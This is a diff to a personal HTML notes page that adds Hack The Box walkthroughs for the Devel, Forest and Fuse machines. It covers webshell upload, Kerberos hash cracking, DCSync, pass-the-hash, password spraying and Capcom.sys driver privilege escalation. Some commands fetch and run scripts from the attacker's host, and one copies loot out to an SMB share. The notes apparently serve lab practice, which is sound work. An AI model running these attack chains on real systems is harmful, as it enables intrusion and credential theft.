@@ -309,7 +309,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.18.2023</span>
+        <br><span>last_update:Dec.19.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
     </header>
@@ -2186,54 +2186,87 @@
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Devel (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Devel (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>ftp anonymous upload webshell.asp and find it in /webshell.asp
+                        <br><span class="step_title">Privilege_escalation(web->system)</span>
+                        <br>c:\Windows\Microsoft.NET\Framework>dir /A:D
+                        <br>OR `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`
+                        <br>lastest .NET on target is v3.5 and `systeminfo` output 'System Type: X86-based PC', compile watson on commando VM
+                        <br>https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046
+                        <br>upload and run the MS11-046.exe get system shell
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Forest (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Forest (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>Failed: `smbmap -H 10.10.10.161` `smbmap -H 10.10.10.161 -u test -p test` `smbclient -N -L //10.10.10.161`
+                        <br>`rpcclient -U "" -N 10.10.10.161` `enumdomusers` save users  
+                        <br>`for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`
+                        <br>$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
+                        <br>`john --wordlist=/usr/share/wordlists/rockyou.txt svc-alfresco` got svc-alfresco:s3rvice
+                        <br>`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
+                        <br><span class="step_title">Privilege_escalation(svc-alfresco->Administrator)</span>
+                        <br>`bloodhound-python -u svc-alfresco -p 's3rvice' -ns 10.10.10.161 -d htb.local -c all --zip`
+                        <br>OR use SharpHound.ps1
+                        <br>*Evil-WinRM* PS> iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1") && invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+                        <br>`smbserver.py share . -smb2support -username user -password pass` 
+                        <br>*Evil-WinRM* PS> net use \\10.10.14.6\share /u:user pass
+                        <br>*Evil-WinRM* PS> copy .\*_BloodHound.zip \\10.10.14.6\share\
+                        <br>*Evil-WinRM* PS> net use /d \\10.10.14.6\share
+                        <br>bloodhound shows 'svc-alfresco' is in a nested grouop of 'Account Operators' group which has' Generic All privilege' on the 'Exchange Windows Permissions' group which has 'WriteDacl' on the domain
+                        <br>we can use 0xdf powershell oneliner: Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+                        <br>OR follow ippsec steps:
+                        <br>*Evil-WinRM* PS> net user john abc123! /add /domain
+                        <br>*Evil-WinRM* PS> net group "Exchange Windows Permissions" john /add
+                        <br>*Evil-WinRM* PS> net localgroup "Remote Management Users" john /add
+                        <br>*Evil-WinRM* PS> Bypass-4MSI
+                        <br>*Evil-WinRM* PS> iex(new-object net.webclient).downloadstring('http://10.10.14.29/powerview.ps1')
+                        <br>*Evil-WinRM* PS> $pass = convertto-securestring 'abc123!' -asplain -force
+                        <br>*Evil-WinRM* PS> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
+                        <br>*Evil-WinRM* PS> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+                        <br>`secretsdump.py svc-alfresco:s3rvice@10.10.10.161` got administrator hash
+                        <br>`wmiexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`
+                        <br>`evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`
+                        <br>`psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Fuse (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Fuse (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>save users from papercut webpage
+                        <br>`cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist` note: there is a 'Fabricorp01.docx' shown on page
+                        <br>`hydra -L users -P wordlist 10.10.10.193 smb` found tlavel:Fabricorp01   bhult:Fabricorp01
+                        <br>Failed(Authentication error): `smbmap -u tlavel -p Fabricorp01 -H 10.10.10.193` `smbmap -u bhult -p Fabricorp01 -H 10.10.10.193` 
+                        <br>Failed(NT_STATUS_LOGON_FAILURE): `smbclient -U bhult -L \\\\10.10.10.193`
+                        <br>Failed(NT_STATUS_PASSWORD_MUST_CHANGE): `smbclient -U bhult -L \\\\10.10.10.193`
+                        <br>`smbpasswd -r 10.10.10.193 bhult` enter old pass 'Fabricorp01' and new pass
+                        <br>`rpcclient -U bhult%${pass} 10.10.10.193`
+                        <br>Note: target reset the pass every min, so do it fast
+                        <br>0xdf oneliner: if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi; smbmap -H 10.10.10.193 -u bhult -p "$pass"
+                        <br>`rpcclient -U bhult%${pass} 10.10.10.193` then `querydispinfo` save users `enumprinters` found pass: $fab@s3Rv1ce$1
+                        <br>`crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success`
+                        <br>`evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'`
+                        <br><span class="step_title">Privilege_escalation(svc-print->system)</span>
+                        <br>`whoami /all` shows 'SeLoadDriverPrivilege Enabled'
+                        <br>`get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'` shows zero protection
+                        <br>https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
+                        <br>https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
+                        <br>upload vuln drive file 'Capcom.sys' to target
+                        <br>https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp
+                        <br>check the arch `systeminfo`
+                        <br>check .Net version `dir /A:D \Windows\Microsoft.NET\Framework` OR `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`
+                        <br>compile eoploaddriver.cpp in vitual studio as eoploaddriver.exe and upload to target
+                        <br>https://github.com/tandasat/ExploitCapcom
+                        <br>edit payload line of ExploitCapcom.cpp in vitual studio then complie as EoPLoadDriver.exe and upload to target
+                        <br>original payload line: TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+                        <br>my edited payload line: TCHAR CommandLine[] = TEXT("C:\\ProgramData\\9001.exe");
+                        <br>of course I upload the 9001.exe as well
+                        <br>`.\eoploaddriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys`
+                        <br>`.\ExploitCapcom.exe`
                     </div>
                 </div>
                 <div class="sub_dropdown">
